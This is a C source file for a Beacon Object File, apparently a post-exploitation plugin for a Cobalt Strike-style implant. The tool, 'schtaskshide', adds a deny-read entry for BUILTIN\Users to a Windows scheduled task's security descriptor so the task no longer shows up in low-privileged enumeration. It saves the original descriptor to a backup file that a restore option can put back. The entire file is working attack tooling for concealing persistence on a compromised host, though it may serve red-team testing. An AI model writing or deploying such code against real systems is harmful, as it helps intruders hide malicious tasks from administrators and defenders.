/*
 * bof-schtaskshide <task-path> [restore]
 *
 * Add a deny-read ACE for BUILTIN\Users to a scheduled task's security
 * descriptor, so low-privileged users no longer see it in Task Scheduler
 * enumerations.  The original SDDL is saved to
 * %TEMP%\bof_schtasks_sd.bak and can be put back with the `restore` argument.
 *
 * Requires the right to change the task's security descriptor (admin for most
 * tasks).  Run `restore` from the same user context that saved the backup.
 *
 * Example: schtaskshide \Microsoft\Windows\MyTask
 *          schtaskshide \Microsoft\Windows\MyTask restore
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const GUID GUID_TaskScheduler =
    { 0x0f87369f, 0xa4e5, 0x4cfc,
      { 0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd } };
static const GUID GUID_ITaskService =
    { 0x2faba4c7, 0x4da9, 0x4013,
      { 0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85 } };

/* MinGW's taskschd.h omits the LONG flags argument on these two methods, but
 * the real COM vtable has it.  Call through the correct prototype. */
typedef HRESULT (STDMETHODCALLTYPE *GetFolderFn)(void *, BSTR, LONG, ITaskFolder **);
typedef HRESULT (STDMETHODCALLTYPE *GetTaskFn)(void *, BSTR, LONG, IRegisteredTask **);

static void sddl_to_utf8(BSTR b, char *out, int outsz)
{
    out[0] = 0;
    if (b) bof_w2a(b, out, outsz);
}

static int read_backup(char *out, int outsz)
{
    char path[MAX_PATH];
    HANDLE h;
    DWORD got = 0;

    out[0] = 0;
    KERNEL32$GetTempPathA(sizeof(path), path);
    bof_strncat(path, "bof_schtasks_sd.bak", sizeof(path) - bof_strlen(path) - 1);
    h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    if (!KERNEL32$ReadFile(h, out, (DWORD)outsz - 1, &got, NULL)) got = 0;
    out[got] = 0;
    KERNEL32$CloseHandle(h);
    return got > 0 ? 0 : -1;
}

static int write_backup(const char *sddl)
{
    char path[MAX_PATH];
    HANDLE h;
    DWORD wr = 0;

    KERNEL32$GetTempPathA(sizeof(path), path);
    bof_strncat(path, "bof_schtasks_sd.bak", sizeof(path) - bof_strlen(path) - 1);
    h = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return -1;
    if (!KERNEL32$WriteFile(h, sddl, (DWORD)bof_strlen(sddl), &wr, NULL)) wr = 0;
    KERNEL32$CloseHandle(h);
    return wr > 0 ? 0 : -1;
}

void go(char *args, int alen)
{
    datap parser;
    char *task = "", *mode = "";
    int tlen = 0, mlen = 0, i, cut = -1;
    wchar_t wfolder[512], wname[256], wsd[8192];
    char folder[512], name[256], oldsd[8192], newsd[9000];
    ITaskService *svc = NULL;
    ITaskFolder *tf = NULL;
    IRegisteredTask *rt = NULL;
    BSTR bfolder = NULL, bname = NULL, bsddl = NULL, bnew = NULL;
    VARIANT e;
    HRESULT hr;
    int coinit = 0, restore;

    BeaconDataParse(&parser, args, alen);
    task = BeaconDataExtract(&parser, &tlen);
    mode = BeaconDataExtract(&parser, &mlen);
    if (!task || !task[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: schtaskshide <task-path> [restore]\n");
        return;
    }
    if (!mode) mode = "";
    restore = bof_stricmp(mode, "restore") == 0;

    if (task[0] != '\\') {
        folder[0] = '\\';
        bof_strncpy(folder + 1, task, sizeof(folder) - 1);
    } else {
        bof_strncpy(folder, task, sizeof(folder));
    }
    for (i = 0; folder[i]; i++) if (folder[i] == '\\') cut = i;
    if (cut <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "task path must look like \\Folder\\Name\n");
        return;
    }
    bof_strncpy(name, folder + cut + 1, sizeof(name));
    if (cut == 0) {
        bof_strcpy(folder, "\\");
    } else {
        folder[cut] = 0;
    }
    if (!name[0]) {
        BeaconPrintf(CALLBACK_ERROR, "missing task name\n");
        return;
    }

    if (bof_a2w(folder, wfolder, 512) <= 0 || bof_a2w(name, wname, 256) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "task path too long\n");
        return;
    }

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (SUCCEEDED(hr)) coinit = 1;
    else if (hr != (HRESULT)0x80010106L) {
        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx: 0x%08lx\n", (unsigned long)hr);
        return;
    }

    hr = OLE32$CoCreateInstance(&GUID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                                &GUID_ITaskService, (void **)&svc);
    if (FAILED(hr) || !svc) {
        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance(TaskScheduler): 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    OLEAUT32$VariantInit(&e);
    e.vt = VT_EMPTY;
    hr = svc->lpVtbl->Connect(svc, e, e, e, e);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "ITaskService::Connect: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }

    bfolder = OLEAUT32$SysAllocString(wfolder);
    bname = OLEAUT32$SysAllocString(wname);
    if (!bfolder || !bname) goto cleanup;

    {
        GetFolderFn fn = NULL;
        bof_memcpy(&fn, &svc->lpVtbl->GetFolder, sizeof(fn));
        hr = fn(svc, bfolder, 0, &tf);
    }
    if (FAILED(hr) || !tf) {
        BeaconPrintf(CALLBACK_ERROR, "GetFolder(%s): 0x%08lx\n", folder,
                     (unsigned long)hr);
        goto cleanup;
    }
    {
        GetTaskFn fn = NULL;
        bof_memcpy(&fn, &tf->lpVtbl->GetTask, sizeof(fn));
        hr = fn(tf, bname, 0, &rt);
    }
    if (FAILED(hr) || !rt) {
        BeaconPrintf(CALLBACK_ERROR, "GetTask(%s): 0x%08lx\n", name,
                     (unsigned long)hr);
        goto cleanup;
    }

    hr = rt->lpVtbl->GetSecurityDescriptor(rt, 0, &bsddl);
    if (FAILED(hr) || !bsddl) {
        BeaconPrintf(CALLBACK_ERROR, "GetSecurityDescriptor: 0x%08lx\n",
                     (unsigned long)hr);
        goto cleanup;
    }
    sddl_to_utf8(bsddl, oldsd, sizeof(oldsd));
    BeaconPrintf(CALLBACK_OUTPUT, "[*] current SDDL: %s\n", oldsd);

    if (restore) {
        if (read_backup(oldsd, sizeof(oldsd)) != 0) {
            BeaconPrintf(CALLBACK_ERROR,
                         "no backup at %%TEMP%%\\bof_schtasks_sd.bak\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] restoring: %s\n", oldsd);
        if (bof_a2w(oldsd, wsd, 8192) <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "SDDL too long\n");
            goto cleanup;
        }
        bnew = OLEAUT32$SysAllocString(wsd);
        if (!bnew) goto cleanup;
        hr = rt->lpVtbl->SetSecurityDescriptor(rt, bnew, 0);
        if (SUCCEEDED(hr))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] security descriptor restored\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "SetSecurityDescriptor: 0x%08lx\n",
                         (unsigned long)hr);
        goto cleanup;
    }

    if (write_backup(oldsd) != 0)
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] warning: could not save backup to %%TEMP%%\n");

    if (oldsd[0] == 'D' && oldsd[1] == ':') {
        bof_strncpy(newsd, "D:(D;;FRFX;;;BU)", sizeof(newsd));
        bof_strncat(newsd, oldsd + 2, sizeof(newsd) - bof_strlen(newsd) - 1);
    } else {
        bof_strncpy(newsd, "D:(D;;FRFX;;;BU)", sizeof(newsd));
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] new SDDL    : %s\n", newsd);
    if (bof_a2w(newsd, wsd, 8192) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "SDDL too long\n");
        goto cleanup;
    }
    bnew = OLEAUT32$SysAllocString(wsd);
    if (!bnew) goto cleanup;

    hr = rt->lpVtbl->SetSecurityDescriptor(rt, bnew, 0);
    if (SUCCEEDED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] %s hidden from BUILTIN\\Users\n", task);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[*] undo with: schtaskshide %s restore\n", task);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "SetSecurityDescriptor: 0x%08lx (admin?)\n",
                     (unsigned long)hr);
    }

cleanup:
    if (bnew) OLEAUT32$SysFreeString(bnew);
    if (bsddl) OLEAUT32$SysFreeString(bsddl);
    if (bname) OLEAUT32$SysFreeString(bname);
    if (bfolder) OLEAUT32$SysFreeString(bfolder);
    if (rt) rt->lpVtbl->Release(rt);
    if (tf) tf->lpVtbl->Release(tf);
    if (svc) svc->lpVtbl->Release(svc);
    if (coinit) OLE32$CoUninitialize();
}
